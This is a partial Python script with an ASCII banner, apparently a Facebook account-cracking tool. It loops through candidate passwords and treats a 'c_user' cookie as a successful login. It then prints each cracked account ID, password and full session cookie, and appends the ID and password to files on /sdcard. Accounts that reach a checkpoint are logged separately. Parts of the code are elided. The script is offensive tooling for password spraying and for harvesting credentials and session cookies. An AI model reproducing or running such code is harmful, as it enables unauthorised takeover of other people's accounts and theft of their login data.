...
$$ |      $$ |  $$ |$$ |$$ |  $$ |$$  _$$<  
$$ |      \$$$$$$  |$$ |\$$$$$$  |$$ | \$$\ 
\__|       \______/ \__| \______/ \__|  \__|\033[1;37m\n""")
def ud():
    os.system('clear')
    jalan(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[PUL0K-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/PUL0K-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[PUL0K-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/PUL0K-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[PUL0K] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
